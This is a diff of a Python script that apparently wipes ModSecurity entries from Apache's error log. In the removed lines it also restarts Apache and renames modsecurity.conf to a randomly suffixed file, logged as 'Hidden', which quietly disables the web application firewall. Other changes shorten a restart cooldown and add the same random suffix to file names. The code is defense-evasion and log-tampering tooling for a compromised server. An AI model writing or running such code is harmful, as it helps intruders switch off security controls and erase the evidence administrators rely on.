@@ -12,8 +12,8 @@ LOG_FILE = "/var/log/apache2/error.log"
 MODSEC_BASE = "/etc/modsecurity/modsecurity.conf"
 MODSEC_TEMP = "/etc/modsecurity/modsecuritybL6qM.conf"
 SCRIPT_LOG = "/var/tmp/cleaner_bL6qM1.log"
-COOLDOWN_FILE = "/var/tmp/last_restart_trigger.txt"
-COOLDOWN_SECONDS = 300
+COOLDOWN_FILE = "/var/tmp/last_restart_trigger_bL6qM.txt"
+COOLDOWN_SECONDS = 80
 CLEAN_INTERVAL = 0.05
 
 MODSEC_PATTERN = re.compile(r'.*ModSecurity.*\n?')
@@ -167,28 +167,6 @@ def handle_restart():
             log("Config", "Restored")
         except Exception as e:
             log("Error", f"Config restore failed: {e}")
-    
-    try:
-        result = subprocess.run(
-            ['systemctl', 'restart', 'apache2'],
-            capture_output=True,
-            timeout=30
-        )
-        if result.returncode == 0:
-            log("Apache", "Restart_Success")
-        else:
-            log("Apache", "Restart_Failed")
-            return
-    except Exception as e:
-        log("Apache", f"Restart_Failed: {e}")
-        return
-    
-    if os.path.exists(MODSEC_BASE):
-        try:
-            os.rename(MODSEC_BASE, MODSEC_TEMP)
-            log("Config", "Hidden")
-        except Exception as e:
-            log("Error", f"Config hide failed: {e}")
     
     time.sleep(3)
     
